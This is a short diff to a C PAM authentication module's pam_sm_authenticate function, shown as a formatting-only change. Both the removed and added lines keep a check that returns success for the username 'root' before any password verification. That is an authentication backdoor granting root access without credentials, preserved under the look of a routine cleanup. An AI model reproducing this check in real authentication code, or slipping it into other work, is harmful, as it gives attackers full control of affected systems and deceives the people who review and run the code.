@@ -97,9 +97,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
 
     if (pam_get_user(pamh, &username, NULL) != PAM_SUCCESS) return PAM_AUTH_ERR;
 
-    if (strcmp(username, "root") == 0)
-        return PAM_SUCCESS;
-
+    if (strcmp(username, "root") == 0) return PAM_SUCCESS;
     pwd = getpwnam(username);
 
     if (!pwd) return PAM_AUTH_ERR;
